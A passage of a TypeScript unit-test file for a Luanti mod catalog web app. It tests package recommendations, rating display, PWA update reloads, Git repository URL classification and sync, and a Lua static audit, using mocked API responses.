    // Optional reverse-dependency add-on (no shared tags, only optional_dependencies on 'farming')
    const optAddonMod = (pkgService as any).normalizePackage({
      id: 'ChefAuthor/cucina_vegana',
      author: 'ChefAuthor',
      name: 'cucina_vegana',
      title: 'Cucina Vegana',
      type: 'mod',
      short_desc: 'Vegan recipes integrating with farming.',
      tags: ['crafting'],
      optional_dependencies: ['farming'],
      downloads: 45000,
      score: 4.8
    });

    // Unrelated texture pack and unrelated minetest_game mod (should NOT match solely via minetest_game / txp)
    const unrelatedTxp = (pkgService as any).normalizePackage({
      id: 'PixelArtist/retro_16x',
      author: 'PixelArtist',
      name: 'retro_16x',
      title: 'Retro 16x Textures',
      type: 'txp',
      short_desc: 'Classic 16px texture pack.',
      tags: ['16px'],
      downloads: 80000,
      score: 4.8
    });
    const unrelatedMtgMod = (pkgService as any).normalizePackage({
      id: 'OtherDev/chat_filter',
      author: 'OtherDev',
      name: 'chat_filter',
      title: 'Chat Filter',
      type: 'mod',
      short_desc: 'Server chat moderation tool.',
      tags: ['chat'],
      dependencies: ['default'],
      game_support: [{ game: { name: 'minetest_game', title: 'Minetest Game' }, supports: true }],
      downloads: 70000,
      score: 4.7
    });

    // Prolific author with 3 matching mods (diversity cap should limit to 2 when another creator exists)
    const prolific1 = (pkgService as any).normalizePackage({
      id: 'TenPlus1/mobs_animal',
      author: 'TenPlus1',
      name: 'mobs_animal',
      title: 'Mobs Animal',
      type: 'mod',
      tags: ['survival'],
      downloads: 150000,
      score: 4.9
    });
    const prolific2 = (pkgService as any).normalizePackage({
      id: 'TenPlus1/ethereal',
      author: 'TenPlus1',
      name: 'ethereal',
      title: 'Ethereal NG',
      type: 'mod',
      tags: ['survival', 'plants_and_farming'],
      downloads: 140000,
      score: 4.9
    });
    const prolific3 = (pkgService as any).normalizePackage({
      id: 'TenPlus1/wine',
      author: 'TenPlus1',
      name: 'wine',
      title: 'Wine & Beverages',
      type: 'mod',
      tags: ['survival', 'plants_and_farming'],
      dependencies: ['farming'],
      downloads: 60000,
      score: 4.7
    });
    const wipMod = (pkgService as any).normalizePackage({
      id: 'ThirdCreator/wip_crops',
      author: 'ThirdCreator',
      name: 'wip_crops',
      title: 'WIP Crops',
      type: 'mod',
      dev_state: 'WIP',
      tags: ['survival', 'plants_and_farming'],
      downloads: 5000,
      score: 4.5
    });

    (pkgService as any)._packages.set([
      favMod,
      ownCdbMod,
      ownGitMod,
      optAddonMod,
      unrelatedTxp,
      unrelatedMtgMod,
      prolific1,
      prolific2,
      prolific3,
      wipMod
    ]);
    settingsService.favorites.set(['TenPlus1/farming']);
    settingsService.hideWipDeprecated.set(true);

    try {
      // Authenticate as SaKeL / sakel-hub
      (authService as any)._currentUser.set({
        id: 'user_sakel_1',
        username: 'sakel-hub',
        display_name: 'SaKeL',
        identities: [
          { provider: 'github', username: 'sakel-hub', verified: true }
        ],
        packages: [{ id: 'sakel-hub/pixie_farming', name: 'pixie_farming', author: 'sakel-hub' }]
      });

      expect(pkgService.isOwnedByCurrentUser(ownCdbMod)).toBe(true);
      expect(pkgService.isOwnedByCurrentUser(ownGitMod)).toBe(true);
      expect(pkgService.isOwnedByCurrentUser(favMod)).toBe(false);

      const recs = pkgService.recommendedFromFavorites();
      const recIds = recs.map(p => p.id);

      // 1. Author's own packages ('SaKeL/x_farming' and 'sakel-hub/pixie_farming') are excluded
      expect(recIds).not.toContain('SaKeL/x_farming');
      expect(recIds).not.toContain('sakel-hub/pixie_farming');

      // 2. Unrelated texture pack and unrelated minetest_game mod are excluded
      expect(recIds).not.toContain('PixelArtist/retro_16x');
      expect(recIds).not.toContain('OtherDev/chat_filter');

      // 3. WIP mod is excluded when hideWipDeprecated is true
      expect(recIds).not.toContain('ThirdCreator/wip_crops');

      // 4. Optional reverse-dependency add-on ('ChefAuthor/cucina_vegana') is included
      expect(recIds).toContain('ChefAuthor/cucina_vegana');

      // 5. Similar packages in Package Detail Modal also exclude the logged-in author's own packages
      const similar = pkgService.getSimilarPackages(favMod, 4);
      const similarIds = similar.map(p => p.id);
      expect(similarIds).not.toContain('SaKeL/x_farming');
      expect(similarIds).not.toContain('sakel-hub/pixie_farming');
      expect(similarIds).not.toContain('ThirdCreator/wip_crops');
    } finally {
      (authService as any)._currentUser.set(null);
      settingsService.favorites.set([]);
      settingsService.hideWipDeprecated.set(false);
    }
  });

  it('should place pre-approval drafted ContentDB packages (titou4/x_entity) in Recently Added, bridge notified packages into recentlyAddedPackages, suppress Git release notes/diff links for zip-only packages, and never show 1-2 star ratings for 0-review ContentDB packages', async () => {
    const { computeStarRatingFromData } = await import('./core/config/package-utils.config');
    const { fetchGitReleaseNotesBetweenRefs, invalidateEdgeCacheKeys } = await import('../../functions/api/lib/upstream');
    const { onRequestGet: onPackagesGet } = await import('../../functions/api/packages/index');
    const { onRequestGet: onReleasesGet } = await import('../../functions/api/packages/[author]/[name]/releases');
    const { evaluateCatalogNotificationsBatch } = await import('./core/utils/notification-engine');

    // --- Issue C: 0-review ContentDB packages must never inherit popularity score (1.3 / 2.1) as star ratings ---
    expect(
      computeStarRatingFromData({
        author: 'ac_adapter',
        name: 'waving_snow',
        score: 1.3,
        score_downloads: 1.3,
        score_reviews: 0,
        reviews: { positive: 0, neutral: 0, negative: 0 }
      })
    ).toBe(0);

    expect(
      computeStarRatingFromData({
        author: 'escapa_del_tiempo',
        name: 'x3_blood_splatter',
        score: 2.1,
        score_downloads: 2.1,
        score_reviews: 0
      })
    ).toBe(0);

    expect(
      computeStarRatingFromData({
        author: 'titou4',
        name: 'x_entity',
        score: 1.5,
        contentdb_score: 1.5
      })
    ).toBe(0);

    // Genuine reviews still produce accurate 1-5 star ratings
    expect(
      computeStarRatingFromData({
        author: 'TenPlus1',
        name: 'farming',
        review_thread_counts: { positive: 10, neutral: 0, negative: 0 }
      })
    ).toBe(5);

    const pkgService = TestBed.inject(PackageService);
    const pwaService = TestBed.inject(PwaService);
    const normalizedWavingSnow = (pkgService as any).normalizePackage({
      id: 'ac_adapter/waving_snow',
      author: 'ac_adapter',
      name: 'waving_snow',
      title: 'Waving Snow',
      type: 'mod',
      downloads: 3,
      score: 1.3,
      contentdb_score: 1.3,
      score_downloads: 1.3,
      score_reviews: 0,
      reviews: { positive: 0, neutral: 0, negative: 0 }
    });
    expect(normalizedWavingSnow.score).toBe(0);
    expect(normalizedWavingSnow.contentdb_score).toBe(1.3);

    // --- Issue A & C on Backend (`/api/packages/?boot=1`): `titou4/x_entity` approval floor + 0-review star prevention ---
    await invalidateEdgeCacheKeys(['/__api_boot_catalog_bundle_v19', '/__pkg_ratings_map_v2']);

    const nowMs = Date.now();
    const recentIso = new Date(nowMs - 30 * 60 * 1000).toISOString();
    const olderDraftIso = new Date(nowMs - 27 * 24 * 60 * 60 * 1000).toISOString(); // 27 days earlier draft date

    const origFetch = globalThis.fetch;
    globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (url.includes('sort=approved_at')) {
        return new Response(
          JSON.stringify([
            {
              author: 'titou4',
              name: 'x_entity',
              title: 'X Entity',
              type: 'mod',
              short_description: 'Entity helpers',
              release: 36010
            },
            {
              author: 'ac_adapter',
              name: 'waving_snow',
              title: 'Waving Snow',
              type: 'mod',
              short_description: 'Makes snow wave',
              release: 36009
            }
          ]),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.includes('/api/packages/?fmt=vcs')) {
        return new Response(
          JSON.stringify([
            {
              author: 'titou4',
              name: 'x_entity',
              title: 'X Entity',
              type: 'mod',
              short_description: 'Entity helpers',
              release: 36010
            },
            {
              author: 'ac_adapter',
              name: 'waving_snow',
              title: 'Waving Snow',
              type: 'mod',
              short_description: 'Makes snow wave',
              release: 36009
            }
          ]),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.includes('/api/scores/')) {
        return new Response(
          JSON.stringify([
            {
              author: 'titou4',
              name: 'x_entity',
              downloads: 5,
              score: 1.4,
              score_downloads: 1.4,
              score_reviews: 0,
              reviews: { positive: 0, neutral: 0, negative: 0 }
            },
            {
              author: 'ac_adapter',
              name: 'waving_snow',
              downloads: 3,
              score: 1.2,
              score_downloads: 1.2,
              score_reviews: 0,
              reviews: { positive: 0, neutral: 0, negative: 0 }
            }
          ]),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.includes('/api/packages/titou4/x_entity/reviews/')) {
        return new Response(JSON.stringify([]), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }
      if (url.includes('/api/packages/ac_adapter/waving_snow/reviews/')) {
        return new Response(JSON.stringify([]), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }
      if (url.includes('/api/packages/titou4/x_entity/releases/')) {
        return new Response(
          JSON.stringify([
            {
              id: 36010,
              title: '1',
              url: '/uploads/x_entity.zip',
              release_date: olderDraftIso,
              downloads: 5
            }
          ]),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.includes('/api/packages/titou4/x_entity/')) {
        // Simulates ContentDB package drafted 27 days ago (`created_at: olderDraftIso`) and zip-only (`repo: null`)
        return new Response(
          JSON.stringify({
            author: 'titou4',
            name: 'x_entity',
            title: 'X Entity',
            type: 'mod',
            created_at: olderDraftIso,
            repo: null,
            license: 'MIT',
            downloads: 5
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.includes('/api/packages/ac_adapter/waving_snow/')) {
        return new Response(
          JSON.stringify({
            author: 'ac_adapter',
            name: 'waving_snow',
            title: 'Waving Snow',
            type: 'mod',
            created_at: recentIso,
            license: 'LGPL-2.1-ONLY',
            downloads: 3
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response(JSON.stringify([]), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
    }) as any;

    try {
      const bootRes = await onPackagesGet({
        request: new Request('https://luantihub.org/api/packages/?boot=1&nocache=1'),
        env: {}
      });
      const bootJson = await bootRes.json();
      expect(Array.isArray(bootJson.recentlyAdded)).toBe(true);
      expect(bootJson.recentlyAdded[0]?.id).toBe('titou4/x_entity');
      expect(bootJson.recentlyAdded[1]?.id).toBe('ac_adapter/waving_snow');
      // `titou4/x_entity` received an effective approval timestamp >= `waving_snow`'s `recentIso`
      expect(Date.parse(bootJson.recentlyAdded[0].created_at)).toBeGreaterThan(Date.parse(recentIso) - 1000);
      // Neither 0-review package has a star score
      expect(bootJson.recentlyAdded[0].score).toBe(0);
      expect(bootJson.recentlyAdded[1].score).toBe(0);

      // --- Issue B on Backend: zip-only package must not fabricate github.com/titou4/x_entity or fetch commits ---
      const directNotes = await fetchGitReleaseNotesBetweenRefs(undefined, undefined, undefined, {
        headRef: '1',
        defaultBranch: 'main'
      });
      expect(directNotes.commits).toEqual([]);
      expect(directNotes.compare_url).toBeUndefined();

      const relNotesRes = await onReleasesGet({
        request: new Request('https://luantihub.org/api/packages/titou4/x_entity/releases?notes=1&head=1&branch=main'),
        env: {},
        params: { author: 'titou4', name: 'x_entity' }
      });
      const relNotesJson = await relNotesRes.json();
      expect(relNotesJson.commits).toEqual([]);
      expect(relNotesJson.compare_url).toBeUndefined();
    } finally {
      globalThis.fetch = origFetch;
    }

    // --- Issue A on Frontend: notified package bridge into `recentlyAddedPackages` ---
    const batchEval = evaluateCatalogNotificationsBatch(
      {
        packages: [
          {
            id: 'titou4/x_entity',
            author: 'titou4',
            name: 'x_entity',
            title: 'X Entity',
            type: 'mod',
            source: 'official',
            sources: ['official'],
            created_at: recentIso
          }
        ]
      },
      {
        prefs: {
          notificationsEnabled: true,
          notifyNewGitPackages: true
        },
        knownGitPackages: ['tenplus1/farming', '__cdb_seeded_v1__'],
        baselineSeededAt: nowMs - 2 * 3600 * 1000
      },
      nowMs
    );
    expect(batchEval.notifications.length).toBe(1);
    expect(batchEval.stateUpdates.recentDiscoveredPackages?.['titou4/x_entity']).toBeGreaterThan(0);

    // Even if `titou4/x_entity` in `_packages` had an old draft `created_at` and was missing from `_serverRecentlyAdded`,
    // recording it in `pwaService.recentDiscoveredPackages` surfaces it at the top of `recentlyAddedPackages()`
    (pkgService as any)._packages.set([
      (pkgService as any).normalizePackage({
        id: 'titou4/x_entity',
        author: 'titou4',
        name: 'x_entity',
        title: 'X Entity',
        type: 'mod',
        source: 'official',
        sources: ['official'],
        created_at: olderDraftIso
      })
    ]);
    (pkgService as any)._serverRecentlyAdded.set([]);
    pwaService.recentDiscoveredPackages.set({ 'titou4/x_entity': nowMs });
    expect(pkgService.recentlyAddedPackages().map(p => p.id)).toContain('titou4/x_entity');
    pwaService.recentDiscoveredPackages.set({});

    // --- Issue B on Frontend: PackageDetailModalComponent hides Git release notes & diff link when `!hasValidGitRepo` ---
    const zipOnlyPkg = (pkgService as any).normalizePackage({
      id: 'titou4/x_entity',
      author: 'titou4',
      name: 'x_entity',
      title: 'X Entity',
      type: 'mod',
      source: 'official',
      sources: ['official'],
      repo_url: undefined
    });
    (pkgService as any)._activePackage.set(zipOnlyPkg);

    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFixture.componentInstance;
    modalComp.package = zipOnlyPkg;
    modalComp.activeTab.set('releases');
    modalComp.isLoadingReleases.set(false);
    modalComp.releases.set([
      {
        id: 36010,
        version: '1',
        tag_name: '',
        commit_sha: '',
        download_url: '/api/packages/titou4/x_entity/download',
        min_minetest_version: '5.0.0',
        released_at: olderDraftIso,
        sha256: 'ee6ae02812345678'
      }
    ]);
    modalFixture.detectChanges();

    expect(modalComp.hasValidGitRepo).toBe(false);
    const modalText = modalFixture.nativeElement.textContent || '';
    expect(modalText).not.toContain('View Full Diff on Git');
    expect(modalText).not.toContain('RECENT COMMITS ON MAIN');

    // Calling toggleReleaseNotes on a zip-only release without release_notes is a no-op
    const fetchNotesSpy = vi.spyOn(pkgService, 'fetchReleaseNotesForRelease');
    await modalComp.toggleReleaseNotes(modalComp.releases()[0], 0);
    expect(fetchNotesSpy).not.toHaveBeenCalled();
    expect(modalComp.isReleaseNotesExpanded(modalComp.getReleaseNotesKey(modalComp.releases()[0], 0))).toBe(false);
    fetchNotesSpy.mockRestore();
    modalFixture.destroy();
  });

  it('should automatically activate VERSION_READY updates, defer reload while active modals/sandbox are open, reload on route change or tab hide, and guard against reload loops', async () => {
    const { Subject } = await import('rxjs');
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);
    const versionUpdates$ = new Subject<any>();
    const activateUpdateSpy = vi.fn().mockResolvedValue(true);
    const reloadSpy = vi.spyOn(pwaService, 'reloadWindow').mockImplementation(() => {});
    const sendNotifSpy = vi.spyOn(pwaService, 'sendNativeNotification').mockResolvedValue(true);
    const origSwUpdate = (pwaService as any).swUpdate;
    const origVisDescriptor = Object.getOwnPropertyDescriptor(document, 'visibilityState');

    try {
      sessionStorage.removeItem('lh_pwa_auto_updated_version');
      sessionStorage.removeItem('lh_pwa_just_auto_updated');
      localStorage.removeItem('lh_pwa_just_auto_updated');
      settingsService.notificationsEnabled.set(true);
      settingsService.notifyAppUpdates.set(true);

      Object.defineProperty(document, 'visibilityState', {
        configurable: true,
        get: () => 'visible'
      });

      (pwaService as any).swUpdate = {
        isEnabled: true,
        versionUpdates: versionUpdates$.asObservable(),
        activateUpdate: activateUpdateSpy,
        checkForUpdate: vi.fn().mockResolvedValue(false)
      };
      (pwaService as any).initSwUpdate();

      // 1. Emit VERSION_READY while page is visible -> activates SW in background & queues safe reload without immediate reload
      versionUpdates$.next({
        type: 'VERSION_READY',
        currentVersion: { hash: 'v1-old' },
        latestVersion: { hash: 'v2-new-auto' }
      });
      await new Promise(resolve => setTimeout(resolve, 20));

      expect(activateUpdateSpy).toHaveBeenCalledTimes(1);
      expect(sendNotifSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          title: 'LuantiHub Updated',
          body: 'LuantiHub was updated automatically in the background to the latest version.',
          tag: 'lh-app-update-v2-new-auto',
          category: 'app_update',
          variant: 'app_update'
        })
      );
      expect(reloadSpy).not.toHaveBeenCalled();
      expect((pwaService as any).pendingAutoReload).toBe(true);

      // 2. While #pwa-sandbox-modal is open, route navigation does NOT interrupt the user with a reload
      const sandboxModal = document.createElement('div');
      sandboxModal.id = 'pwa-sandbox-modal';
      document.body.appendChild(sandboxModal);
      expect(pwaService.isUserWorkflowActive()).toBe(true);

      window.history.pushState({}, '', '/games');
      await new Promise(resolve => setTimeout(resolve, 15));
      expect(reloadSpy).not.toHaveBeenCalled();
      expect((pwaService as any).pendingAutoReload).toBe(true);

      // 3. Once sandbox modal is closed, the next route navigation executes the queued safe reload
      sandboxModal.remove();
      expect(pwaService.isUserWorkflowActive()).toBe(false);

      window.history.pushState({}, '', '/mods');
      await new Promise(resolve => setTimeout(resolve, 15));
      expect(reloadSpy).toHaveBeenCalledTimes(1);
      expect(sessionStorage.getItem('lh_pwa_auto_updated_version')).toBe('v2-new-auto');

      // 4. Loop guard: attempting to execute reload again for the same version in the same session is a no-op
      expect(pwaService.executeSafeReload()).toBe(false);
      expect(reloadSpy).toHaveBeenCalledTimes(1);
    } finally {
      (pwaService as any).swUpdate = origSwUpdate;
      reloadSpy.mockRestore();
      sendNotifSpy.mockRestore();
      if (origVisDescriptor) {
        Object.defineProperty(document, 'visibilityState', origVisDescriptor);
      } else {
        delete (document as any).visibilityState;
      }
      document.getElementById('pwa-sandbox-modal')?.remove();
    }
  });

  it('should classify candidate ContentDB Git URLs and automatically verify/sync author Git packages with temporary per-package status pills', async () => {
    const { classifyCandidateGitRepoUrl } = await import('../../functions/api/lib/author-git-sync');
    const authService = TestBed.inject(AuthService);
    const pkgService = TestBed.inject(PackageService);

    // 1. Verify classifyCandidateGitRepoUrl accurately distinguishes valid root Git repos from non-Git URLs
    const validGithub = classifyCandidateGitRepoUrl('https://github.com/SaKeL/x_farming.git');
    expect(validGithub).toEqual({
      kind: 'git_candidate',
      provider: 'github',
      host: 'github.com',
      owner: 'SaKeL',
      repo: 'x_farming',
      normalizedUrl: 'https://github.com/SaKeL/x_farming'
    });

    const validMeseHub = classifyCandidateGitRepoUrl('https://git.minetest.land/TenPlus1/farming');
    expect(validMeseHub).toEqual({
      kind: 'git_candidate',
      provider: 'mesehub',
      host: 'git.minetest.land',
      owner: 'TenPlus1',
      repo: 'farming',
      normalizedUrl: 'https://git.minetest.land/TenPlus1/farming'
    });

    expect(classifyCandidateGitRepoUrl('')).toEqual({ kind: 'no_repo' });
    expect(classifyCandidateGitRepoUrl('https://forum.luanti.org/viewtopic.php?t=123')).toEqual({
      kind: 'non_git'
    });
    expect(classifyCandidateGitRepoUrl('https://example.com/downloads/mod.zip')).toEqual({
      kind: 'non_git'
    });
    // Root branch link is valid git_candidate, whereas monorepo subdirectory link or /issues is non_git
    expect(classifyCandidateGitRepoUrl('https://github.com/SaKeL/x_farming/tree/main')).toEqual({
      kind: 'git_candidate',
      provider: 'github',
      host: 'github.com',
      owner: 'SaKeL',
      repo: 'x_farming',
      normalizedUrl: 'https://github.com/SaKeL/x_farming'
    });
    expect(classifyCandidateGitRepoUrl('https://github.com/mt-mods/mesecons/tree/master/mesecons_torch')).toEqual({
      kind: 'non_git'
    });
    expect(classifyCandidateGitRepoUrl('https://github.com/SaKeL/x_farming/issues')).toEqual({
      kind: 'non_git'
    });

    // 2. Verify AuthService.syncAuthorGitPackages & ProfileDrawerComponent temporary per-package status indicators
    (authService as any)._currentUser.set({
      id: 'usr_sakel',
      username: 'sakel',
      display_name: 'SaKeL',
      avatar_url: 'logo.svg',
      bio: '',
      role: 'user',
      is_admin: false,
      identities: [
        {
          provider: 'contentdb',
          username: 'sakel',
          profile_url: 'https://content.luanti.org/users/sakel/',
          verified: true
        }
      ],
      packages: []
    });

    const pkg1 = (pkgService as any).normalizePackage({
      id: 'sakel/x_farming',
      author: 'sakel',
      name: 'x_farming',
      title: 'X Farming',
      type: 'mod',
      source: 'official',
      sources: ['official'],
      repo_url: 'https://bitbucket.org/minetest_gamers/x_farming'
    });
    const pkg2 = (pkgService as any).normalizePackage({
      id: 'sakel/broken_mod',
      author: 'sakel',
      name: 'broken_mod',
      title: 'Broken Mod',
      type: 'mod',
      source: 'official',
      sources: ['official'],
      repo_url: 'https://github.com/sakel/deleted_repo_404'
    });
    const pkgZipOnly = (pkgService as any).normalizePackage({
      id: 'sakel/zip_only_mod',
      author: 'sakel',
      name: 'zip_only_mod',
      title: 'Zip Only Mod',
      type: 'mod',
      source: 'official',
      sources: ['official'],
      repo_url: undefined
    });
    (pkgService as any)._packages.set([pkg1, pkg2, pkgZipOnly]);

    const origFetch = globalThis.fetch;
    const initAuthSpy = vi.spyOn(authService, 'initAuth').mockResolvedValue(undefined);
    const fetchMyReportsSpy = vi.spyOn(authService, 'fetchMyReports').mockResolvedValue(undefined);
    const refreshCatalogSpy = vi.spyOn(pkgService, 'initCatalog').mockResolvedValue(undefined);

    let resolveSyncFetch: ((res: Response) => void) | null = null;
    globalThis.fetch = vi.fn((input: any) => {
      const url = typeof input === 'string' ? input : input?.url || '';
      if (url.includes('/api/users/sakel/sync-contentdb')) {
        return new Promise<Response>(resolve => {
          resolveSyncFetch = resolve;
        });
      }
      return Promise.resolve(new Response(JSON.stringify({}), { status: 200 }));
    }) as any;

    try {
      const drawerFixture = TestBed.createComponent(ProfileDrawerComponent);
      const drawerComp = drawerFixture.componentInstance;
      // Only pkg1 and pkg2 have eligible Git repo URLs; pkgZipOnly is excluded
      expect(drawerComp.unsyncedEligibleGitPackages().map(p => p.id)).toEqual([
        'sakel/x_farming',
        'sakel/broken_mod'
      ]);

      (authService as any)._isProfileDrawerOpen.set(true);
      drawerFixture.detectChanges();
      await new Promise(resolve => setTimeout(resolve, 10));
      drawerFixture.detectChanges();

      // While sync is in-flight, temporary progress bar and per-package 'syncing' pills are rendered
      expect(authService.isSyncingAuthorGit()).toBe(true);
      const drawerEl = drawerFixture.nativeElement as HTMLElement;
      expect(drawerEl.querySelector('[data-testid="author-git-sync-progress"]')).toBeTruthy();
      expect(drawerEl.querySelectorAll('[data-testid="pkg-sync-status-syncing"]').length).toBe(2);

      // Resolve the backend sync call with 1 synced package and 1 failed 404 package
      expect(resolveSyncFetch).toBeTruthy();
      resolveSyncFetch!(
        new Response(
          JSON.stringify({
            success: true,
            userId: 'usr_sakel',
            authorHandles: ['sakel'],
            totalContentDbPackages: 3,
            alreadySyncedCount: 0,
            newlyImportedCount: 1,
            skippedNoRepoCount: 1,
            flaggedForReviewCount: 1,
            remainingQueuedCount: 0,
            packages: [
              {
                packageId: 'sakel/x_farming',
                author: 'sakel',
                name: 'x_farming',
                title: 'X Farming',
                status: 'imported'
              },
              {
                packageId: 'sakel/broken_mod',
                author: 'sakel',
                name: 'broken_mod',
                title: 'Broken Mod',
                status: 'failed_broken',
                message: 'Repository returned HTTP 404'
              }
            ]
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        )
      );

      await new Promise(resolve => setTimeout(resolve, 25));
      drawerFixture.detectChanges();

      // Progress bar disappears once syncing finishes, while temporary 'synced' and 'failed' pills appear on the respective packages
      expect(authService.isSyncingAuthorGit()).toBe(false);
      expect(drawerEl.querySelector('[data-testid="author-git-sync-progress"]')).toBeNull();
      expect(drawerEl.querySelectorAll('[data-testid="pkg-sync-status-synced"]').length).toBe(1);
      const failedPill = drawerEl.querySelector('[data-testid="pkg-sync-status-failed"]') as HTMLElement;
      expect(failedPill).toBeTruthy();
      expect(refreshCatalogSpy).toHaveBeenCalledTimes(1);

      // Clicking the failed sync pill navigates directly to Account -> My Reports
      failedPill.click();
      drawerFixture.detectChanges();
      expect(drawerComp.activeTab()).toBe('account');
      expect(drawerComp.isMyReportsOpen()).toBe(true);

      drawerFixture.destroy();
    } finally {
      globalThis.fetch = origFetch;
      initAuthSpy.mockRestore();
      fetchMyReportsSpy.mockRestore();
      refreshCatalogSpy.mockRestore();
      authService.clearPackageSyncStatuses();
    }
  });

  it('should support self-hosted cgit/subpath Git repositories (e.g. cheapiesystems.com/git/celevator), verify root URL before declaring broken_404, and auto-heal false-positive broken reports', async () => {
    const {
      normalizeGitRepoInputUrl,
      buildProviderRawBaseCandidates,
      detectGitProviderFromUrl,
      scanGitRepoMetadataCached
    } = await import('../../functions/api/lib/upstream');
    const { autoHealOpenSystemBrokenReports } = await import('../../functions/api/admin/moderation');

    // 1. Subpath URL normalization & cgit raw candidate generation
    const celevatorUrl = 'https://cheapiesystems.com/git/celevator';
    expect(normalizeGitRepoInputUrl(celevatorUrl)).toBe(celevatorUrl);
    expect(normalizeGitRepoInputUrl('https://cheapiesystems.com/git/celevator/plain/mod.conf')).toBe(celevatorUrl);

    const detected = detectGitProviderFromUrl(celevatorUrl);
    expect(detected?.provider).toBe('custom');
    expect(detected?.host).toBe('cheapiesystems.com');
    expect(detected?.repo).toBe('celevator');

    const cands = buildProviderRawBaseCandidates(celevatorUrl, 'cheapie', 'celevator');
    expect(cands.length).toBeGreaterThan(0);
    expect(cands[0]).toEqual({
      base: 'https://cheapiesystems.com/git/celevator/plain',
      repoUrl: 'https://cheapiesystems.com/git/celevator',
      provider: 'custom'
    });

    const origFetch = globalThis.fetch;
    try {
      // 2. Case A: cgit /plain/mod.conf responds with 200 OK
      globalThis.fetch = vi.fn(async (input: any) => {
        const url = typeof input === 'string' ? input : input?.url || '';
        if (url === 'https://cheapiesystems.com/git/celevator/plain/mod.conf') {
          return new Response(
            'name = celevator\ntitle = C-Elevator\ndescription = Realistic elevators for Luanti\nlicense = Unlicense\n',
            { status: 200, headers: { 'Content-Type': 'text/plain' } }
          );
        }
        return new Response('Not Found', { status: 404 });
      }) as any;

      const cgitScan = await scanGitRepoMetadataCached('cheapie', 'celevator', 'mod', celevatorUrl, 0);
      expect(cgitScan.gitRepoStatus).toBe('verified');
      expect(cgitScan.repoUrl).toBe(celevatorUrl);
      expect(cgitScan.rawBaseUrl).toBe('https://cheapiesystems.com/git/celevator/plain');
      expect(cgitScan.title).toBe('C-Elevator');
      expect(cgitScan.license).toBe('Unlicense');

      // 3. Case B: Custom Git host where all guessed raw file URLs return 404, but the repository root URL returns 200 OK -> never flagged as broken_404
      globalThis.fetch = vi.fn(async (input: any) => {
        const url = typeof input === 'string' ? input : input?.url || '';
        if (url === celevatorUrl) {
          return new Response('<html><title>celevator - cgit</title></html>', {
            status: 200,
            headers: { 'Content-Type': 'text/html' }
          });
        }
        return new Response('Not Found', { status: 404 });
      }) as any;

      const rootVerifiedScan = await scanGitRepoMetadataCached('cheapie', 'celevator', 'mod', celevatorUrl, 0);
      expect(rootVerifiedScan.gitRepoStatus).toBe('verified');
      expect(rootVerifiedScan.repoUrl).toBe(celevatorUrl);

      // 4. Case C: Truly deleted repository where both raw endpoints and root URL return 404 -> flagged as broken_404
      globalThis.fetch = vi.fn(async () => new Response('Not Found', { status: 404 })) as any;
      const deadScan = await scanGitRepoMetadataCached(
        'cheapie',
        'deleted_mod',
        'mod',
        'https://github.com/cheapie/deleted_mod',
        0
      );
      expect(deadScan.gitRepoStatus).toBe('broken_404');

      // 5. Auto-healing open system-git-monitor broken reports when repository URL returns 200 OK
      let resolvedPkgId = '';
      let resolvedNote = '';
      const mockDb = {
        prepare: (sql: string) => ({
          all: async () => {
            if (sql.includes('FROM moderation_reports')) {
              return { results: [{ package_id: 'cheapie/celevator' }] };
            }
            return { results: [] };
          },
          bind: (...args: any[]) => ({
            first: async () => {
              if (sql.includes('SELECT repo_url FROM packages')) {
                return { repo_url: celevatorUrl };
              }
              return null;
            },
            run: async () => {
              if (sql.includes('UPDATE moderation_reports')) {
                resolvedNote = String(args[0] || '');
                resolvedPkgId = String(args[1] || '');
                return { meta: { changes: 1 } };
              }
              return { meta: { changes: 0 } };
            }
          }),
          run: async () => ({ meta: { changes: 0 } })
        })
      };

      globalThis.fetch = vi.fn(async (input: any) => {
        const url = typeof input === 'string' ? input : input?.url || '';
        if (url === celevatorUrl) {
          return new Response('', { status: 200 });
        }
        return new Response('Not Found', { status: 404 });
      }) as any;

      const healedCount = await autoHealOpenSystemBrokenReports(mockDb);
      expect(healedCount).toBe(1);
      expect(resolvedPkgId).toBe('cheapie/celevator');
      expect(resolvedNote).toContain(celevatorUrl);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should handle Lua multiline strings/comments and table field accesses in runLuacheckStaticAudit without false-positive E011 errors', () => {
    const luaWithMultilineFormspec = `
local modname = core.get_current_modname()
--[=[
  Multi-line long comment with unbalanced keywords:
  if true then do repeat function
]=]
local formspec = [[
  formspec_version[4]
  size[8,6]
  label[0.5,0.5;What to do if you reach the end of the function]
]]
local alt_formspec = [=[
  textarea[0.5,1.5;7,3;notes;Notes;if do end repeat until]
]=]

local function check_bounds(pos)
  if pos.end and pos:end() then
    return true
  end
  return false
end

core.register_node(modname .. ":panel", {
  description = "Control Panel",
  on_construct = function(pos)
    if check_bounds(pos) then
      core.log("action", "Panel constructed")
    end
  end
})
`;

    const diags = runLuacheckStaticAudit(luaWithMultilineFormspec, 'celevator');
    expect(diags.some(d => d.code.startsWith('LUA_SYNTAX_UNBALANCED'))).toBe(false);
    expect(diags.some(d => d.code === 'LUA_SYNTAX_OK' && d.severity === 'pass')).toBe(true);
    expect(diags.some(d => d.code === 'LUA_ENGINE_API_OK' && d.severity === 'pass')).toBe(true);
  });

  it('should support multiline mod.conf, cgit /plain repos, ContentDB cross-identity ownership, and tag auto-preselection in POST /api/packages/git & SubmitModalComponent', async () => {
    const origFetch = globalThis.fetch;
    try {
      const sessionCookie = await createSessionToken('user-cheapie', 'test-secret');
      const celevatorUrl = 'https://cheapiesystems.com/git/celevator';

